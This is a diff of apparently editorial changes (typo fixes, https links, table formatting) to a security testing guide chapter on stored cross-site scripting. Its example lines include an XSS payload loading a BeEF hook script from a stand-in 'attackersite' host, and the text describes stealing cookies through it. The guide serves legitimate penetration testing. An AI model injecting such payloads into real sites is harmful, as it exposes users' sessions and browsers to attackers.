@@ -8,7 +8,7 @@
 
 Stored [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack. This chapter illustrates examples of stored cross site scripting injection and related exploitation scenarios.
 
-Stored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. As a consequence, the malicious data will appear to be part of the web site and run within the user’s browser under the privileges of the web application. Since this vulnerability typically involves at least two requests to the application, this may also called second-order XSS.
+Stored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. As a consequence, the malicious data will appear to be part of the site and run within the user’s browser under the privileges of the web application. Since this vulnerability typically involves at least two requests to the application, this may also called second-order XSS.
 
 This vulnerability can be used to conduct a number of browser-based attacks including:
 
@@ -26,7 +26,7 @@ Stored XSS does not need a malicious link to be exploited. A successful exploita
 - User visits vulnerable page
 - Malicious code is executed by the user's browser
 
-This type of attack can also be exploited with browser exploitation frameworks such as [BeEF](https://beefproject.com) and [XSS Proxy](http://xss-proxy.sourceforge.net/). These frameworks allow for complex JavaScript exploit development.
+This type of attack can also be exploited with browser exploitation frameworks such as [BeEF](https://beefproject.com) and [XSS Proxy](https://xss-proxy.sourceforge.net/). These frameworks allow for complex JavaScript exploit development.
 
 Stored XSS is particularly dangerous in application areas where users with high privileges have access. When the administrator visits the vulnerable page, the attack is automatically executed by their browser. This might expose sensitive information such as session authorization tokens.
 
@@ -43,7 +43,7 @@ The process for identifying stored XSS vulnerabilities is similar to the process
 
 #### Input Forms
 
-The first step is to identify all points where user input is stored into the back-end and then displayed by the application. Typical examples of stored user input can be found in:
+The first step is to identify all points where user input is stored into the backend and then displayed by the application. Typical examples of stored user input can be found in:
 
 - User/Profiles page: the application allows the user to edit/change profile details such as first name, last name, nickname, avatar, picture, address, etc.
 - Shopping cart: the application allows the user to store items into the shopping cart which can then be reviewed later
@@ -85,7 +85,7 @@ This involves testing the input validation and filtering controls of the applica
 
 Ensure the input is submitted through the application. This normally involves disabling JavaScript if client-side security controls are implemented or modifying the HTTP request with a web proxy. It is also important to test the same injection with both HTTP GET and POST requests. The above injection results in a popup window containing the cookie values.
 
-> ![Stored XSS Exxample](images/Stored_xss_example.jpg)\
+> ![Stored XSS Example](images/Stored_xss_example.jpg)\
 > *Figure 4.7.2-2: Stored Input Example*
 >
 > The HTML code following the injection:
@@ -98,7 +98,7 @@ Ensure the input is submitted through the application. This normally involves di
 
 #### Leverage Stored XSS with BeEF
 
-Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as [BeEF](https://www.beefproject.com) and [XSS Proxy](http://xss-proxy.sourceforge.net/).
+Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as [BeEF](https://www.beefproject.com) and [XSS Proxy](https://xss-proxy.sourceforge.net/).
 
 A typical BeEF exploitation scenario involves:
 
@@ -111,7 +111,7 @@ The JavaScript hook can be injected by exploiting the XSS vulnerability in the w
 **Example**: BeEF Injection in `index2.php`:
 
 ```html
-aaa@aa.com"><script src=http://attackersite/hook.js></script>
+aaa@aa.com"><script src=https://attackersite/hook.js></script>
 ```
 
 When the user loads the page `index2.php`, the script `hook.js` is executed by the browser. It is then possible to access cookies, user screenshot, user clipboard, and launch complex XSS attacks.
@@ -151,7 +151,7 @@ Also consider that Internet Explorer does not handle MIME types in the same way 
 
 ### Blind Cross-site Scripting
 
-Blind Cross-site Scripting is a form of stored XSS. It generally occurs when the attacker’s payload is saved on the server/infrstructure and later reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application views the attacker’s submission via the backend application, the attacker’s payload will get executed. Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is [XSS Hunter](https://xsshunter.com/).
+Blind Cross-site Scripting is a form of stored XSS. It generally occurs when the attacker’s payload is saved on the server/infrastructure and later reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application views the attacker’s submission via the backend application, the attacker’s payload will get executed. Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is [XSS Hunter](https://xsshunter.com/).
 
 > Note: Testers should carefully consider the privacy implications of using public or third party services while performing security tests. (See #tools.)
 
@@ -159,12 +159,12 @@ Blind Cross-site Scripting is a form of stored XSS. It generally occurs when the
 
 Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and data storage might be known by the pen-tester.
 
-Depending on the information available, it is normally recommended that testers check how user input is processed by the application and then stored into the back-end system. The following steps are recommended:
+Depending on the information available, it is normally recommended that testers check how user input is processed by the application and then stored into the backend system. The following steps are recommended:
 
-- Use front-end application and enter input with special/invalid characters
+- Use frontend application and enter input with special/invalid characters
 - Analyze application response(s)
 - Identify presence of input validation controls
-- Access back-end system and check if input is stored and how it is stored
+- Access backend system and check if input is stored and how it is stored
 - Analyze source code and understand how stored input is rendered by the application
 
 If source code is available (as in white-box testing), all variables used in input forms should be analyzed. In particular, programming languages such as PHP, ASP, and JSP make use of predefined variables/functions to store input from HTTP GET and POST requests.
@@ -175,8 +175,8 @@ The following table summarizes some special variables and functions to look at w
 |----------------|-------------------|------------------|
 | `$_GET` - HTTP GET variables  | `Request.QueryString` - HTTP GET | `doGet`, `doPost` servlets - HTTP GET and POST |
 | `$_POST` - HTTP POST variables| `Request.Form` - HTTP POST | `request.getParameter` - HTTP GET/POST variables |
-| `$_REQUEST` – HTTP POST, GET and COOKIE variables | `Server.CreateObject` - used to upload files |
-| `$_FILES` - HTTP File Upload variables |
+| `$_REQUEST` – HTTP POST, GET and COOKIE variables | `Server.CreateObject` - used to upload files | |
+| `$_FILES` - HTTP File Upload variables | | |
 
 **Note**: The table above is only a summary of the most important parameters but, all user input parameters should be investigated.
 
@@ -185,10 +185,10 @@ The following table summarizes some special variables and functions to look at w
 - [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.
 - [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).
 - [BeEF](https://www.beefproject.com) is the browser exploitation framework. A professional tool to demonstrate the real-time impact of browser vulnerabilities.
-- [XSS-Proxy](http://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
+- [XSS-Proxy](https://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
 - [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.
 - [XSS Assistant](https://www.greasespot.net/) Greasemonkey script that allow users to easily test any web application for cross-site-scripting flaws.
-- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.
+- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.
 - [XSS Hunter Portable](https://github.com/mandatoryprogrammer/xsshunter) XSS Hunter finds all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS.
 
 ## References
@@ -207,5 +207,4 @@ The following table summarizes some special variables and functions to look at w
 
 - [CERT: "CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests"](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
 - [Amit Klein: "Cross-site Scripting Explained"](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)
-- [Gunter Ollmann: "HTML Code Injection and Cross-site Scripting"](http://www.technicalinfo.net/papers/CSS.html)
 - [CGISecurity.com: "The Cross Site Scripting FAQ"](https://www.cgisecurity.com/xss-faq.html)
